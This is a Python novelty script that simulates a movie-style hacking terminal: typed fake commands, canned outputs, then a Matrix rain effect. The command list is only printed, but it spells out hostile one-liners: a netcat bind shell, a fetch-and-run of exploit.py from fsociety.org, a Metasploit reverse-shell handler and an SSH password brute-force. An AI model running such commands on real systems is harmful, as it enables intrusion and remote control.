#!/usr/bin/env python3

import random
import time
import os
import sys

# ANSI colors
GREEN = "\033[32m"
DARK_GREEN = "\033[2;32m"
BRIGHT_GREEN = "\033[1;32m"
RED = "\033[1;31m"
RESET = "\033[0m"

# Character set (hexadecimal + Matrix style symbols)
CHARS = "0123456789ABCDEF" + "ｱｲｳｴｵｶｷｸｹｺ"

# List of pseudo-random commands (hacking/terminal style)
COMMANDS = [
    "sudo nmap -sS -p- 192.168.1.0/24",
    "hydra -l admin -P rockyou.txt ssh://10.0.0.1",
    "nc -lvp 4444 -e /bin/bash",
    "sqlmap -u http://evilcorp.com/login --dbs",
    "wget http://fsociety.org/exploit.py && python exploit.py",
    "echo '127.0.0.1 evilcorp.com' >> /etc/hosts",
    "iptables -A INPUT -s 10.0.0.0/8 -j DROP",
    "aircrack-ng -w wordlist.txt capture.cap",
    "john --format=nt hash.txt",
    "metasploit -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; run'",
    "git clone https://github.com/fsociety/revshell && cd revshell && make",
    "scp -i id_rsa backdoor root@192.168.1.100:/root/",
    "openssl enc -aes-256-cbc -in secret.txt -out secret.enc",
    "torify curl http://checkip.amazonaws.com",
    "echo 'fsociety' | md5sum",
    "python3 -c 'import socket; socket.socket().connect((\"10.0.0.1\", 4444))'",
    "systemctl stop tor",
    "route add default gw 192.168.1.1",
    "echo 'nameserver 8.8.8.8' > /etc/resolv.conf"
]

# Fake command outputs (randomly chosen)
FAKE_OUTPUTS = [
    "[*] Scanning completed: 256 hosts up",
    "[+] Password found: admin123",
    "[!] Listening on port 4444",
    "[*] Database: 'evilcorp_db' found",
    "[+] Exploit executed successfully",
    "[*] Hosts file updated",
    "[!] Rule added to iptables",
    "[+] WPA handshake captured",
    "[*] Hash cracked in 12 seconds",
    "[+] Meterpreter session opened",
    "[*] Backdoor deployed",
    "[+] File encrypted",
    "[*] Your IP: 185.220.101.12 (via Tor)",
    "fsociety",
    "[*] Tor service stopped",
    "[*] Gateway changed to 192.168.1.1",
    "[+] DNS set to 8.8.8.8"
]

# Possible prompts (standard and alternate)
PROMPTS = ['$', '#', 'root@fsociety:~$']

def typewriter(text, delay=0.08, end='\n'):
    """Prints text one character at a time, simulating typing."""
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(end)
    sys.stdout.flush()

def print_command_with_output(prompt_str, delay=0.08):
    """Prints a prompt, a random command, and a random fake output."""
    sys.stdout.write(prompt_str + ' ')
    sys.stdout.flush()
    cmd = random.choice(COMMANDS)
    typewriter(cmd, delay=delay, end='\n')
    time.sleep(0.4)
    output = random.choice(FAKE_OUTPUTS)
    typewriter(f"    {output}", delay=0.05, end='\n')
    time.sleep(0.6)

def get_terminal_size():
    return os.get_terminal_size().columns, os.get_terminal_size().lines

def start_matrix_rain():
    cols, lines = get_terminal_size()
    column_pos = [-random.randint(1, lines) for _ in range(cols)]
    column_speed = [random.randint(1, 4) for _ in range(cols)]
    
    os.system('clear')
    sys.stdout.write("\033[?25l")
    sys.stdout.flush()
    
    # Periodic phrase handling
    frame_counter = 0
    frames_per_minute = int(60 / 0.08)
    phrase_frames = int(5 / 0.08)
    show_phrase = False
    phrase_remaining_frames = 0
    phrase_text = "Fuck Society. Fuck Evil Corp."
    
    try:
        while True:
            screen = [[' ' for _ in range(cols)] for _ in range(lines)]
            
            if frame_counter % frames_per_minute == 0:
                show_phrase = True
                phrase_remaining_frames = phrase_frames
            
            if show_phrase and phrase_remaining_frames > 0:
                start_col = max(0, (cols - len(phrase_text)) // 2)
                center_row = lines // 2
                for i, ch in enumerate(phrase_text):
                    if start_col + i < cols:
                        screen[center_row][start_col + i] = f"{RED}{ch}{RESET}"
                phrase_remaining_frames -= 1
                if phrase_remaining_frames == 0:
                    show_phrase = False
            
            # Character rain
            for c in range(cols):
                pos = column_pos[c]
                speed = column_speed[c]
                
                for offset in range(4):
                    row = pos - offset
                    if 0 <= row < lines:
                        if offset == 0:
                            char = random.choice(CHARS)
                            color = BRIGHT_GREEN
                        elif offset == 1:
                            char = random.choice(CHARS)
                            color = GREEN
                        else:
                            char = random.choice(CHARS)
                            color = DARK_GREEN
                        if screen[row][c] == ' ':
                            screen[row][c] = f"{color}{char}{RESET}"
                
                column_pos[c] += speed
                if column_pos[c] - 3 >= lines:
                    column_pos[c] = -random.randint(1, 10)
                    column_speed[c] = random.randint(1, 4)
            
            # Print screen
            output = []
            for row in screen:
                output.append(''.join(row))
            sys.stdout.write("\033[H" + "\n".join(output))
            sys.stdout.flush()
            time.sleep(0.08)
            frame_counter += 1
            
    except KeyboardInterrupt:
        sys.stdout.write("\033[?25h")
        sys.stdout.write(RESET)
        print("\n\nWake up Neo... The system is a lie...\n")
        sys.exit(0)

if __name__ == "__main__":
    # 1. Print "<Hello Friend/>"
    typewriter("<Hello Friend/>", delay=0.12, end='\n')
    time.sleep(0.5)
    
    # 2. Numbers 1 through 5
    for i in range(1, 6):
        typewriter(str(i), delay=0.2, end='\n')
        time.sleep(0.3)
    
    # 3. 10 pairs: random prompt + command + output, twice per pair
    for pair in range(10):
        prompt1 = random.choice(PROMPTS)
        print_command_with_output(prompt1, delay=0.08)
        prompt2 = random.choice(PROMPTS)
        print_command_with_output(prompt2, delay=0.08)
    
    # 4. Final command that starts the Matrix effect
    sys.stdout.write('$ ')
    sys.stdout.flush()
    typewriter("./boot_matrix.sh", delay=0.08, end='\n')
    time.sleep(1)
    typewriter("    [*] Initializing Matrix...", delay=0.05, end='\n')
    time.sleep(1)
    
    # 5. Welcome message before starting the rain
    typewriter("Welcome in the Matrix, welcome to the Matrix", delay=0.08, end='\n')
    time.sleep(1.5)
    
    # Start the Matrix effect
    start_matrix_rain()
